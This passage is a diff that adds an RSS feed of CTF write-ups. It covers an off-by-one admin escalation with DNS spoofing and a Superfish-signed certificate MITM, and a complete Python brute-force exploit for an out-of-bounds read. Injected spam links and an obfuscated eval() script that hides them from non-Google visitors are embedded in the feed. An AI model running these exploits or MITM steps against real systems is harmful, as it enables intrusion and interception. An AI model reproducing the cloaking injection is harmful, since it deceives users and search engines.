@@ -1,0 +1,831 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xml:base="https://ctfcrew.org"  xmlns:dc="http://purl.org/dc/elements/1.1/">
+<channel>
+ <title>BalalaikaCr3w - pwn</title>
+ <link>https://ctfcrew.org/categories/pwn</link>
+ <description></description>
+ <language>en</language>
+<item>
+ <title>Kendall (pwn - 300)</title>
+ <link>https://ctfcrew.org/writeup/97</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/32&quot;&gt;Boston Key Party 2015&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;Description of task is pretty small:&lt;/p&gt;&lt;p&gt;52.0.164.37:8888&lt;/p&gt;&lt;p&gt;And &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/kendall.tar_.gz&quot;&gt;link&lt;/a&gt; to file (ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, stripped).&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;After connecting to the server we receive the following menu:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#####################################################
+# DHCP Management Console                           #
+# Auditing Interface                                #
+#####################################################
+
+ h  show this help
+ a  authenticate
+ c  config menu
+ d  dhcp lease menu
+ e  exit
+
+[m]#&lt;/pre&gt;&lt;p&gt;&lt;em&gt;authenticate&lt;/em&gt; - stage for inputting administrator&#039;s password&lt;/p&gt;&lt;p&gt;&lt;em&gt;config menu&lt;/em&gt;:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;[c]# h
+
+ h  show this help
+ l  list keys/values
+ s  change start ip
+ e  change end ip
+ k  change netmask ip
+ n  change nameserver ip
+ m  return to main menu
+[c]# l
+ DHCP Configuration: 
+	Start IP:   192.168.000.100
+	End IP:     192.168.000.200
+	Netmask:    255.255.255.000
+	Nameserver: 8.8.8.8&lt;/pre&gt;&lt;p&gt;&lt;em&gt;dhcp lease menu&lt;/em&gt;:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;[d]# h
+
+ h  show this help
+ r  renew leases
+ l  list leases
+ f  filter leases
+ m  return to main menu
+&lt;/pre&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;Ok, we&#039;ve got some sort of router&#039;s management console. But anyway the task&#039;s type is pwn and we&#039;ve got the binary, so...&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bk2015kendall_writeup_meme_image.jpg&quot; alt=&quot;&quot; width=&quot;420&quot; height=&quot;250&quot;&gt;&lt;/p&gt;&lt;p&gt;Surely we should reverse the binary and find some vulnerable stuff there!&lt;/p&gt;&lt;p&gt;After investigation of the binary we notice that all input reading is done into global buffer &lt;em&gt;s2&lt;/em&gt; which size is exatcly 128 bytes:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bkp2015_kendall_global_buffer_s2.PNG&quot; alt=&quot;&quot; width=&quot;651&quot; height=&quot;210&quot;&gt;&lt;/p&gt;&lt;p&gt;Hope you&#039;ve already noted that the buffer followed by global variable containing current user status - administrator or not. I called it &lt;em&gt;adminFlag&lt;/em&gt;. The only legal way to change that flag is through&amp;nbsp;&lt;em&gt;authenticate&lt;/em&gt; menu. Authentication served by the following function:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bkp2015_kenall_password_cheking.PNG&quot; alt=&quot;&quot; width=&quot;529&quot; height=&quot;489&quot;&gt;&lt;/p&gt;&lt;p&gt;And it looks pertty safe. But if we try to understand how &lt;em&gt;reading input&lt;/em&gt; function works:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bkp2015_kendall_read_128_func.PNG&quot; alt=&quot;&quot; width=&quot;352&quot; height=&quot;411&quot;&gt;&lt;/p&gt;&lt;p&gt;We see that there is a off by one error. Fortunately it is byte of &lt;em&gt;adminFlag&lt;/em&gt; which should be zero&#039;ed to escalate our access rights. So for escalation to administrator we need:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;find call to &lt;em&gt;sub_400EA6()&lt;/em&gt; with argument length &amp;gt;= 128&lt;/li&gt;&lt;li&gt;write 128 bytes followed&amp;nbsp;&lt;strong&gt;&#039;\n&#039;&lt;/strong&gt; to make 129th byte to be zero&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Jumping to xrefs of&amp;nbsp;&lt;em&gt;sub_400EA6()&lt;/em&gt;function we find one place where it is called with argument&#039;s value of 128:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bkp2015_kendall_filter_function.PNG&quot; alt=&quot;&quot; width=&quot;482&quot; height=&quot;455&quot;&gt;&lt;/p&gt;&lt;p&gt;Nice! It is &lt;em&gt;filter leases&lt;/em&gt; stage of&amp;nbsp;&lt;em&gt;dhcp lease menu&lt;/em&gt; we saw above. Well, exploit for rights escalation is easy and small:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;doris$ python -c &quot;open(&#039;pl&#039;, &#039;wb&#039;).write(&#039;d\n&#039; + &#039;f\n&#039; + &#039;A&#039; * 128 + &#039;\n&#039;)&quot;
+doris$ cat pl - | nc 52.0.164.37 8888
+#####################################################
+# DHCP Management Console                           #
+# Auditing Interface                                #
+#####################################################
+
+ h  show this help
+ a  authenticate
+ c  config menu
+ d  dhcp lease menu
+ e  exit
+
+[m]# [d]# Enter filter condition: [d]$&lt;/pre&gt;&lt;p&gt;BOOM! We became the administrator. Sadly, it does not give us any flag. Task worths 300 points, by the way, so it should not be so easy. As administrator now we have another possibilities in context of service. Now we are able to:&lt;/p&gt;&lt;p&gt;not only list but also change DHCP configuration:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;[c]$ l
+ DHCP Configuration: 
+	Start IP:   192.168.000.100
+	End IP:     192.168.000.200
+	Netmask:    255.255.255.000
+	Nameserver: 8.8.8.8
+[c]$ s
+Current Value: 192.168.000.100
+New Value: asd
+Your input asd cointains invalid characters. Only digits and dots allowed!&lt;/pre&gt;&lt;p&gt;and now we can execute &lt;em&gt;renew leases&lt;/em&gt; action:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bkp_kenall_renew_leases_system_call.PNG&quot; alt=&quot;&quot; width=&quot;886&quot; height=&quot;193&quot;&gt;&lt;/p&gt;&lt;p&gt;OMG! It is pure &lt;em&gt;system()&lt;/em&gt; call with string which is coltrolled by us (arguments for sprintf are IP addresses of DHCP config).&lt;/p&gt;&lt;p&gt;Sadly again, but it is not so easy. It is BKP CTF&#039;s task for 300 points, remember?&lt;/p&gt;&lt;p&gt;Function for processing DHCP settings update called for each IP address we input:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bkp2015_kendall_read_ip_and_change.PNG&quot; alt=&quot;&quot; width=&quot;910&quot; height=&quot;514&quot;&gt;&lt;/p&gt;&lt;p&gt;it has some small bugs, but anyway we can not provide any useful payload for &lt;em&gt;system()&lt;/em&gt; call - only digits and dots are really allowed.&lt;/p&gt;&lt;p&gt;Further investigation of the binary did not give any other exploitable vulnerabilities. We were really stucked, because it is &lt;em&gt;pwn&lt;/em&gt; task and usually we expect some serious binary exploitation, even hardcore exploitation because of 300 points.&lt;/p&gt;&lt;p&gt;Later, when we finally understand that there is nothing to do with the binary we return back to:&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;img src=&quot;/sites/default/files/writeups/images/bkp2015_kendall_dhcp_lease_menu_meme.PNG&quot; alt=&quot;&quot; width=&quot;427&quot; height=&quot;194&quot;&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;Fuzzing DHCP settings we try to set up DNS IP for our own server&#039;s address. Then listen for anything incoming traffic there:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;root@evildns:/tmp# tcpdump -n dst port 53
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
+12:27:44.272585 IP 52.0.164.37.52440 &amp;gt; 188.166.48.175.53: 26405+ A? yandex.ru. (27)
+&lt;/pre&gt;&lt;p&gt;Stop please...&lt;/p&gt;&lt;p&gt;We received DNS query for russian leading search engine hostname?&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bkp2015_kendall_meme_what.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;374&quot;&gt;&lt;/p&gt;&lt;p&gt;That is really suprisingly and a little bit unbeliviable, because CTF is hosted by BostonKeyParty team from USA, but that is true. Looks like time for some &lt;em&gt;DNS Spoofing&lt;/em&gt; have come:&lt;/p&gt;&lt;p&gt;Honestly, &lt;em&gt;yandex.ru&lt;/em&gt; is not the only hostname queried from task&#039;s service (52.0.164.37). Then it queries for &lt;em&gt;my.bank&lt;/em&gt; domain.&lt;/p&gt;&lt;p&gt;After spoofing &lt;em&gt;yandex.ru&lt;/em&gt; address we tried to listen 80 port on our server but did not receive any traffic. After solving the challenge we have known from task author that we should receive HTTP-request at 80 port, but honestly we did not receive this.&lt;/p&gt;&lt;p&gt;One of the ways to go further is to setup &lt;em&gt;dnsmasq&lt;/em&gt; service:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;root@evildns:/tmp# dnsmasq --no-daemon --log-queries
+dnsmasq: started, version 2.62 cachesize 150
+dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
+dnsmasq: reading /etc/resolv.conf
+dnsmasq: using nameserver 209.244.0.3#53
+dnsmasq: using nameserver 8.8.8.8#53
+dnsmasq: using nameserver 8.8.4.4#53
+dnsmasq: read /etc/hosts - 8 addresses
+dnsmasq: query[A] yandex.ru from 52.0.164.37
+dnsmasq: forwarded yandex.ru to 8.8.4.4
+dnsmasq: forwarded yandex.ru to 8.8.8.8
+dnsmasq: forwarded yandex.ru to 209.244.0.3
+dnsmasq: reply yandex.ru is 213.180.204.11
+dnsmasq: reply yandex.ru is 93.158.134.11
+dnsmasq: reply yandex.ru is 213.180.193.11
+dnsmasq: query[A] yandex.ru from 52.0.164.37
+dnsmasq: cached yandex.ru is 213.180.193.11
+dnsmasq: cached yandex.ru is 93.158.134.11
+dnsmasq: cached yandex.ru is 213.180.204.11
+dnsmasq: query[A] my.bank from 52.0.164.37
+dnsmasq: /etc/hosts my.bank is 188.166.48.175&lt;/pre&gt;&lt;p&gt;Dump all traffic after set up of &lt;em&gt;dnsmasq&lt;/em&gt; and then try to find incoming connection:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bkp2015_kendall_tcpdump_https.PNG&quot; alt=&quot;&quot; width=&quot;1200&quot; height=&quot;447&quot;&gt;&lt;/p&gt;&lt;p&gt;It is coming to port 443... Okay. Let&#039;s process it, hope the final is close!&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;root@evildns:/tmp# nc -lvvv -p 443
+listening on [any] 443 ...
+connect to [188.166.48.175] from ec2-52-0-164-37.compute-1.amazonaws.com [52.0.164.37] 50092
+?&amp;lt;ؠ&amp;lt;??5?_? ?,?E?y?]?^`g&#039;i\??0?,?(?$??
+??kj98???2?.?*?&amp;amp;???=5???
+?/?+?&#039;?#??	??g@32??ED?1?-?)?%???&amp;lt;/?A???
+                                            ??m
+
+42
+
+	
+ ^C sent 0, rcvd 289&lt;/pre&gt;&lt;p&gt;Looks like SSL Client Hello packet. Come on! This task costs just a 300 points!&lt;/p&gt;&lt;p&gt;Looks like we have to set up HTTPS server, let&#039;s do this. I&#039;m sure there are many scripts and light-weight servers for such task, but I had nginx installed and decided to process HTTPS with it.&lt;/p&gt;&lt;p&gt;Create self-signed certificate:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;root@evildns:/etc/nginx# openssl genrsa -out my.bank.key 2048
+Generating RSA private key, 2048 bit long modulus
+............................................................................+++
+............+++
+e is 65537 (0x10001)
+root@evildns:/etc/nginx# openssl req -new -sha1 -key my.bank.key -out my.bank.csr
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter &#039;.&#039;, the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:my.bank
+Email Address []:
+
+Please enter the following &#039;extra&#039; attributes
+to be sent with your certificate request
+A challenge password []:
+An optional company name []:
+root@evildns:/etc/nginx# openssl x509 -req -days 365 -in my.bank.csr -signkey my.bank.key -out my.bank.crt
+Signature ok
+subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd/CN=my.bank
+Getting Private key&lt;/pre&gt;&lt;p&gt;and set up nginx for HTTPS with that cert:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;server {
+        listen          443 ssl;
+
+        ssl_certificate         my.bank.crt;
+        ssl_certificate_key     my.bank.key;
+        ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;
+        ssl on;
+        ssl_session_timeout 5m;
+        ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv3:+EXP;
+        ssl_prefer_server_ciphers on;
+
+        root /data/www;
+
+        location = / {
+                index index.html;
+        }
+
+        location / {
+                default_type &quot;text/html&quot;;
+                try_files $uri $uri.html;
+        }
+}&lt;/pre&gt;&lt;p&gt;Let&#039;s look into traffic again. Hope there should be the flag now!&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;root@evildns:/etc/nginx# tail -f /var/log/nginx/access.log 
+&amp;lt;...&amp;gt;
+52.0.164.37 - - [28/Feb/2015:16:43:02 +0400] &quot;-&quot; 400 0 &quot;-&quot; &quot;-&quot;&lt;/pre&gt;&lt;p&gt;Come on! Where is the flag? We have already even set up HTTPS, WTF?&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/bkp2015_kendall_unknown_ca.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Unknown CA? Of course it is unknown! Where should we get trusted CA who would sign certificate for &lt;em&gt;my.bank&lt;/em&gt; domain?&lt;/p&gt;&lt;p&gt;Our &lt;em&gt;my.bank&lt;/em&gt; certificate is self-signed without any CA. Later we tried to create root CA self-signed certificate and sign &lt;em&gt;my.bank&lt;/em&gt; cert with root CA&#039;s one. It did not help.&lt;/p&gt;&lt;p&gt;As we have known from task&#039;s author after solving the task, HTTP request to &lt;em&gt;yandex.ru&lt;/em&gt; contained hint about this stage. But as I wrote above about &lt;em&gt;yandex.ru&lt;/em&gt;&amp;nbsp;we did not receive any incoimng connection at 80 port when spoofed &lt;em&gt;yandex.ru&lt;/em&gt; domain.&lt;/p&gt;&lt;p&gt;However if you follow the news about Information Security you should hear about leaked &lt;em&gt;Superfish Inc. &lt;/em&gt;certificate (and corresponding pre-installed backdoors in lenovo laptops). More info from &lt;a href=&quot;http://blog.erratasec.com/2015/02/extracting-superfish-certificate.html&quot;&gt;Errata Security blog&lt;/a&gt;, for example.&lt;/p&gt;&lt;p&gt;&amp;nbsp;Let&#039;s try to sign our &lt;em&gt;my.bank&lt;/em&gt; certificate by&amp;nbsp;&lt;em&gt;Superfich Inc&lt;/em&gt;:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;root@evildns:/etc/nginx# openssl x509 -req -days 365 -in my.bank.csr -CAkey super.pem -CA super.crt -out supermy.bank.crt
+Signature ok
+subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd/CN=my.bank
+Getting CA Private Key
+Enter pass phrase for super.pem:&lt;/pre&gt;&lt;p&gt;dnd listen for incoming requests again:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;root@evildns:/etc/nginx# tail -f /var/log/nginx/access.log 
+&amp;lt;...&amp;gt;
+52.0.164.37 - - [28/Feb/2015:13:44:53 +0000] &quot;GET /login/username=FLG-SIK9KSRBHIYUKNGEBXlKW3B7HS2I HTTP/1.1&quot; 404 168 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0&quot;&lt;/pre&gt;&lt;p&gt;I&#039;m happy to say that username from request is the flag!&lt;/p&gt;&lt;p&gt;Flag:&amp;nbsp;&lt;strong&gt;FLG-SIK9KSRBHIYUKNGEBXlKW3B7HS2I&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Afterwords&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;This task is awesome. My teammates and I enjoyed it too much when fully understood how to solve it.&lt;/p&gt;&lt;p&gt;Task and its author are&amp;nbsp;praiseworthy for all these interesting hacking steps which must be done to solve tasks. But not only for that. This is amazing example of how dangerous information technologies are nowadays for general users. Even for all users, I think.&lt;/p&gt;&lt;p&gt;Thank you BostonKeyParty and respect for such challenge!&amp;nbsp;&lt;/p&gt;&lt;p&gt;Overview of task from its author:&amp;nbsp;&lt;a href=&quot;http://mweissbacher.com/blog/2015/03/01/boston-key-party-2015-kendall-challenge-superfish/&quot;&gt;http://mweissbacher.com/blog/2015/03/01/boston-key-party-2015-kendall-challenge-superfish/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Flag:&amp;nbsp;&lt;strong&gt;FLG-SIK9KSRBHIYUKNGEBXlKW3B7HS2I&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.juzsports.com/&quot;&gt;Asics shoes&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfediqshop/release-dates/nike/air-force-1-shadow/&quot;&gt;Women&#039;s Nike nike roshe heart and sole shoes for women Shadow trainers - Latest Releases , Ietp&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Binary Data&quot; title=&quot;application/octet-stream&quot; src=&quot;/modules/file/icons/application-octet-stream.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/kendall.tar_.gz&quot; type=&quot;application/octet-stream; length=5103&quot;&gt;kendall.tar_.gz&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 02 Mar 2015 11:00:58 +0000</pubDate>
+ <dc:creator>Dor1s</dc:creator>
+ <guid isPermaLink="false">97 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/97#comments</comments>
+</item>
+<item>
+ <title>Guess the Flag (Exploit - 200)</title>
+ <link>https://ctfcrew.org/writeup/85</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/27&quot;&gt;Hack.lu CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Look at that guy over there! He&#039;s a bandit from the group that robs the stagecoaches in unpredictable intervals. I think he hasn&#039;t been with them for very long, so he can&#039;t tell whether you&#039;re one of them. Try to look like a bandit and talk to him. He probably won&#039;t just tell you their plan for the attack, but maybe you can ask him some questions? &lt;br&gt;&lt;br&gt;&lt;a href=&quot;https://wildwildweb.fluxfingers.net/static/chals/guess_the_flag_cb153ec1260946d13f5f1f0605e4dff9.tar&quot;&gt;Download&lt;/a&gt;&lt;br&gt;nc wildwildweb.fluxfingers.net 1412&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Solution:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;So we have source code and binary. One look is enough to notice a strange thing in function &lt;em&gt;is_flag_correct&lt;/em&gt;: obviously constant global varibales &lt;em&gt;bin_by_hex&lt;/em&gt; and &lt;em&gt;flag&lt;/em&gt; defined localy! Now we can concentrate in searching vuln and find it in function &lt;em&gt;is_flag_correct&lt;/em&gt;:&lt;/p&gt;&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;    char value1 = bin_by_hex[flag_hex[i*2  ]];
+    char value2 = bin_by_hex[flag_hex[i*2+1]];&lt;/pre&gt;&lt;p&gt;where &lt;em&gt;flag_hex&lt;/em&gt; is a user controlled array on signed bytes! So we can access memory out of array &lt;em&gt;bin_by_hex&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;In binary we see that we can access &lt;em&gt;flag&lt;/em&gt; variable in stack:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic100.png&quot; alt=&quot;&quot; height=&quot;410&quot; width=&quot;374&quot;&gt;&lt;/p&gt;&lt;p&gt;So exploitation idea is to send flag of next type:&amp;nbsp;&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;sendFlag = known_flag_part + &quot;%02x&quot;%(brute_byte)
+sendFlag += &#039;&#039;.join([hex_by_pass_el_index(i) for i in range(len(sendFlag),50)])&lt;/pre&gt;&lt;p&gt;where &lt;em&gt;hex_by_pass_el_index(i)&lt;/em&gt; gives two bytes that cause program to fetch &lt;em&gt;i&lt;/em&gt;-th element of original flag. And we get success message when brute_byte is valid and fail message otherwise.&lt;/p&gt;&lt;p&gt;Here is the full exploit code:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;import string
+import socket
+ERR_SUCCESS = 0
+ERR_CONNECT = -1
+ERR_INVALID_FLAG = -2
+
+host = &#039;wildwildweb.fluxfingers.net&#039;
+port = 1412
+def hex_by_pass_el_index(i):
+	return &#039;0&#039;+chr(0xC0+i)
+def build_hex_pass_guesser(p):
+	r = &#039;&#039;
+	for i in range(len(p)):
+		if p[i]!=None:
+			r += &quot;%02x&quot;%(ord(p[i]))
+		else:
+			r += hex_by_pass_el_index(i)
+	return r
+
+def is_valid(s,p):
+	buf = s.recv(10000)
+	if &#039;guess&#039; not in buf:
+		return ERR_CONNECT
+	s.send(p+&#039;\n&#039;)
+	buf = s.recv(10000)
+	if &#039;Nope&#039; not in buf:
+		return ERR_SUCCESS
+	else:
+		return ERR_INVALID_FLAG
+
+def brute(alph = string.printable):
+	s = None
+	p = [None]*50
+	for k in range(5,len(p)-1):
+		i=0
+		while True:
+			if s==None:
+				s = socket.create_connection((host,port))
+				s.settimeout(5)
+				s.recv(50000)
+			p[k] = alph[i]
+			my_hex_pass = build_hex_pass_guesser(p)
+			bVal = is_valid(s,my_hex_pass)
+			#print(k,i,p,bVal)
+			if bVal==ERR_SUCCESS:
+				break
+			if bVal==ERR_CONNECT:
+				s.close()
+				s=None
+			if bVal==ERR_INVALID_FLAG:
+				i += 1
+		print(p)
+	return p
+
+print(&#039;&#039;.join(brute()))&lt;/pre&gt;&lt;p&gt;&lt;span data-rz-clipboard=&quot;true&quot;&gt;&lt;span data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;TEXT&amp;quot;}&quot;&gt;And the flag is: &lt;/span&gt;&lt;span style=&quot;font-weight: bold;&quot; data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;TEXT&amp;quot;,&amp;quot;T_BOLD&amp;quot;:true}&quot;&gt;flag{6974736a7573746c696b65696e7468656d6f76696573}&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.sneakersbe.com/&quot;&gt;Authentic Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.oft.gov.gi/index.php/eeajbishop/us/shop/new/men/shoes&quot;&gt;Men’s 